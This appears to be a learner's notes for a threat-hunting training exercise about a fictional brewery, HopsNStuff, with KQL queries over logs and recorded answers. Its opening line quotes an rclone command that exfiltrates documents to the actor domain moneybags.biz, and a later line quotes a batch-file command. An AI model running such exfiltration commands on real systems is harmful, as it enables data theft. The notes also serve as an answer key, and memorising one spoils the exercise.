+3/23/2023, 4:59:55 PM	KBBH-MACHINE	rclone.exe	rclone.exe copy --transfers12 "*docx" "*xls" "*pdf" "*zip" moneybags.biz
+
+PassiveDns
+| where domain has "moneybags.biz"
+| project timestamp, ip
+| order by timestamp desc
+///184.48.44.45   date is 2023-03-12T01:25:35.000Z
+
+//Law enforcement agents say the threat actor may have searched for "egg" on the HopsNStuff's website. How many distinct IP addresses do this?
+
+InboundNetworkEvents
+| where url contains "hopsnstuff.com/search?query=egg"
+|distinct src_ip
+//10
+
+79.17.71.226
+157.162.168.217
+184.48.44.45
+175.225.35.207
+2.205.103.179
+185.109.203.255
+112.113.16.67
+1.254.20.14
+219.223.99.101
+200.87.93.78
+
+
+//Law enforcement agents also tell you that the threat actor may have used a batch file but REFUSE to elaborate any further. They tell you it's classified. What command might they be referring to?
+ProcessEvents
+| where process_commandline contains ".bat"
+|distinct process_commandline
+//cmd.exe /c a.bat > C:\wmi.dll 2>&1
+
+///A very specific APT defined by Mandiant has used the exact same cmd.exe command used by this attacker and the same credential stealer for lateral movement. Which APT group is this?
+
+APT41
+
+
+What is the name of one of non-Linux backdoors used by the APT group
+
+//cmd.exe /c a.bat > C:\wmi.dll 2>&1
+ APT group; APT41
+//search in Mitre APT41 backdoor and appears repeatedly in ATT&CK/Mandiant reporting
+
+in google search "for What is the name of one of non-Linux backdoors used by the APT41 by Mandiant pdf" ; 
+////HIGHNOON
+
+How many DNS records have domains with the word "moneybags"?
+
+PassiveDns
+| where domain contains "moneybags"
+| count //31
+
+////On February 8, 2023, Robert Boyce's machine had a file created with a single letter for its name. Search the hash of this file on VirusTotal.
+
+When was it first submitted?
+
+Employees
+| where name contains "Boyce"
+
+7/4/2020, 9:55:20 AM	Robert Boyce	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36	192.168.0.58	robert_boyce@hopsnstuff.com	hopsnstuff.com	roboyce	Secret Formular Guardian	0YXZ-MACHINE
+
+
+FileCreationEvents
+| where username contains "roboyce"
+|where timestamp <= datetime(8/3/2023)
+// C:\ProgramData\PST\a.exe , a.exe
+//f96bf53ddd24df5e346a60695f801c3dd682fa38c40b8fd2ecd2db5bde29783e
+
+search on virtualtotal
+When was it first submitted?  2022-10-02 03:35:57 UTC
+
+///Employee Cindy Lozano reported some strange activity with her email account. A weird file was seen in her Sent folder but she deleted it right away without looking at the name.
+
+What was the name of this file?
+
+Employees
+| where name contains "Lozano"
+
+4/21/2018, 7:42:27 AM	Cindy Lozano	Mozilla/5.0 (Windows NT 5.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0	192.168.2.193	cindy_lozano@hopsnstuff.com	hopsnstuff.com	cilozano	IT associate	3PAT-DESKTOP
+
+InboundNetworkEvents
+| where url contains "cilozano" and url contains "Sent"
+
+//http://hopsnstuff.com/mail/readmail?login_user=cilozano%40hopsnstuff.com&mailbox_folder=Sent%20Mail&download=true&output=messages.rar
+
+/// messages.rar src_ip===200.87.93.78 2023-03-18T11:24:00.000Z
+
+On what date did this actor send their earliest email? YYYY-MM-DD
+
+
+InboundNetworkEvents
+| where url contains "messages.rar"
+| order by timestamp asc 
+
+/// //2023-02-15T17:03:22.000Z  https://hopsnstuff.com/mail/readmail?login_user=edarguello%40hopsnstuff.com&mailbox_folder=Sent%20Mail&download=true&output=messages.rar
+
+let IPactor=
+InboundNetworkEvents
+| where url contains "login_user=" and url contains "mailbox_folder=Sent"
+| distinct src_ip;
+let DomainsAsctor=
+PassiveDns
+| where ip has_any (IPactor)
+| distinct domain;
+Email
+| where link  has_any (DomainsAsctor)
+| order by timestamp asc 
+
+///// Response ; 2023-02-08
+
+
+///On what date did this actor send their most recent email? YYYY-MM-DD
+
+///// datetime(2023-02-08) sender craftbeer@yahoo.com and reply_to beer.beer@yahoo.com
+
+let IPactor=
+InboundNetworkEvents
+| where url contains "login_user=" and url contains "mailbox_folder=Sent"
+| distinct src_ip;
+let DomainsAsctor=
+PassiveDns
+| where ip has_any (IPactor)
+| distinct domain;
+Email
+| where link  has_any (DomainsAsctor)
+| order by timestamp desc 
+
+///current email with the link
+///Email candyfestivals@yahoo.com reply_to craftbeer@yahoo.com
+
+///search all email with this email adress candyfestivals@yahoo.com or craftbeer@yahoo.com
+Email
+| where sender contains "candyfestivals@yahoo.com" or sender contains "craftbeer@yahoo.com"
+| order by timestamp desc 
+///datetime(2023-03-30)
+
+What was the earliest time of day that this actor sent an email? (#AM/PM)
+
+//compare 
+
+///// datetime(2023-02-08) sender craftbeer@yahoo.com and reply_to beer.beer@yahoo.com
+///Email candyfestivals@yahoo.com reply_to craftbeer@yahoo.com
+
+Email
+| where sender contains "candyfestivals@yahoo.com" or sender contains "craftbeer@yahoo.com"
+| project hour = hourofday(timestamp)
+| distinct hour | sort by hour asc
+
+///8Am
+
+
+What was the latest time of day that this actor sent an email? (#AM/PM)
+//18 or 6PM
+
+/////Section 4: 🍭 Sugar Rush Question 1
+
+
+///IP 158.235.158.156 was observed exfiltrating data from mailboxes at HopsNStuff.
+
+How many mailboxes were affected?
+
+InboundNetworkEvents
+| where src_ip contains "158.235.158.156"
+| where url contains "login_user="
+| distinct url //2
+
+
+How many total accounts did IP 158.235.158.156 successfully login into?
+
+AuthenticationEvents
+| where src_ip contains "158.235.158.156"
+| where result contains "success"
+
+///account
+lebedford
+brwinkelman
+
+Whose account was first accessed by IP 158.235.158.156?
+
+3/1/2023, 10:26:28 AM	MAIL-SERVER01	158.235.158.156	Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/2017-10-12 06:31:14 Firefox/3.6.6	lebedford	Successful Login
+
+///username,  lebedford
+
+What was the subject of the email that the user in (3) received leading to their account being compromised?
+
+let Emaillebedford=
+Employees
+| where username contains "lebedford"
+| project email_addr;
+Email
+| where recipient  has_any (Emaillebedford)
+| where sender contains "candyfestivals@yahoo.com" or sender contains "craftbeer@yahoo.com" or sender contains "beer.beer@yahoo.com"
+//|distinct subject
+// verdict== Suspecious 
+// subject is [EXTERNAL] Exclusive Invitation to our Candy Themed Beer Festival
+
+How many actor email addresses were observed associated with the subject in (4)
+
+Email
+| where subject contains "[EXTERNAL] Exclusive Invitation to our Candy Themed Beer Festival"
+
+beer.beer@yahoo.com
+tasting_beer@yahoo.com
+craftbeer@yahoo.com
+candyfestivals@yahoo.com
+
+//4
+
+How many actor domains were observed associated with the subject in (5)?
+
+Email
+| where subject contains "[EXTERNAL] Exclusive Invitation to our Candy Themed Beer Festival"
+|distinct link
+
+maltcraftsweet.org
+maltcrafthops.net
+maltbeerginger.net
+maltcrafthops.com
+
+///4
+
+How many IP addresses were associated via PassiveDNS with the domains in (6)?
+
+let Domainstlis= datatable(Hostnames: string)
+[
+"maltcraftsweet.org",
+"maltcrafthops.net",
+"maltbeerginger.net",
+"maltcrafthops.com"
+];
+PassiveDns
+| where domain has_any (Domainstlis)
+| distinct ip
+
+//5
+
+124.187.26.37
+190.57.8.42
+60.4.187.2
+134.188.1.224
+200.225.207.3
+
+How many top level domains (TLDs) are used by this actor (based on your observations so far)?
+
+.org
+.net
+.com
+
+//3
+
+///How many domains are associated with this actor? Look for patterns and build a query based on their infrastructure registration TTPs (Hint: between 75 and 300)
+
+(beer|candy|ginger|hops|sweet|malt|craft|-){3}
+
+Email
+| where subject contains "[EXTERNAL] Exclusive Invitation to our Candy Themed Beer Festival"
+
+beer.beer@yahoo.com
+tasting_beer@yahoo.com
+craftbeer@yahoo.com
+candyfestivals@yahoo.com
+
+
+let Emailactor= datatable(senderactor: string)
+[
+"beer.beer@yahoo.com",
+"tasting_beer@yahoo.com",
+"craftbeer@yahoo.com",
+"candyfestivals@yahoo.com"
+];    
+Email 
+| where sender has_any (Emailactor)
+| extend domain = tostring(parse_url(link).Host)
+| distinct  domain
+
+PassiveDns
+| (beer|candy|ginger|hops|sweet|malt|craft|-){3} //regex query is not correct
+
+// below the regex curry with AI and internt research
+
+
+PassiveDns
+| where domain matches regex @"(beer|candy|ginger|hops|sweet|malt|craft|-){3}"
+| distinct domain
+//| count //152
+
+How many emails did this actor send?
+
+let Alldomainsactor=
+PassiveDns
+| where domain matches regex @"(beer|candy|ginger|hops|sweet|malt|craft|-){3}"
+| distinct domain;
+Email 
+| where link has_any (Alldomainsactor)
+//93
+
+How many of this actor's emails were actually delivered (not blocked)?
+
+let Alldomainsactor=
+PassiveDns
+| where domain matches regex @"(beer|candy|ginger|hops|sweet|malt|craft|-){3}"
+| distinct domain;
+Email 
+| where link has_any (Alldomainsactor)
+| where verdict !contains "BLOCKED"
+//88
+
+How many HopsNStuff employees clicked on more than 1 link from this actor?
+
+let Alldomainsactor=
+PassiveDns
+| where domain matches regex @"(beer|candy|ginger|hops|sweet|malt|craft|-){3}"
+| project  domain;
+OutboundNetworkEvents
+| where url has_any (toscalar(Alldomainsactor | summarize make_set(domain)))
+| summarize Appearances = count() by src_ip
+| where Appearances > 1 ; //7 
+
+src_ip
+
+192.168.2.56
+192.168.1.63
+192.168.2.148
+192.168.3.2
+192.168.1.124
+192.168.1.146
+192.168.3.142
+
+check if those src_ip are employee
+
+let srcipscompromised= datatable(IP_adress: string)
+[
+"192.168.2.56",
+"192.168.1.63",
+"192.168.2.148",
+"192.168.3.2",
+"192.168.1.124",
+"192.168.1.146",
+"192.168.3.142"
+];
+Employees
+| where ip_addr in (srcipscompromised)
+| project company_domain, name, role, ip_addr
+
+//she is only a GUEST not employee hopsnstuff.com	Jeannette Lee	Stategy Consultant (GUEST)	192.168.3.142  username jelee
+
+///Response is 6
+
+How many accounts at HopsNStuff did this actor attempt to log into?
+
+let Alldomainsactor=
+PassiveDns
+| where domain matches regex @"(beer|candy|ginger|hops|sweet|malt|craft|-){3}"
+| project ip;
+AuthenticationEvents
+| where src_ip in (Alldomainsactor)
+| project username ///74
+
+How many mail accounts did this actor exfiltrate data from? (Hint: Look for clear evidence of this.)
+
+let Alldomainsactor=
+PassiveDns
+| where domain matches regex @"(beer|candy|ginger|hops|sweet|malt|craft|-){3}"
+| distinct ip;
+let userexfiltrated=
+AuthenticationEvents
+| where src_ip in (Alldomainsactor)
+| where result contains "success"
+| distinct username; ///35
+InboundNetworkEvents
+| where src_ip in (Alldomainsactor)
+| where url has_any (userexfiltrated)
+
+
+
+AuthenticationEvents
+| take 1
+
+InboundNetworkEvents
+| take 1
+
+
+PassiveDns
+| where domain matches regex @"(beer|candy|ginger|hops|sweet|malt|craft|-){3}"
+| project domain, ip
+
+
+///// IAM HERE
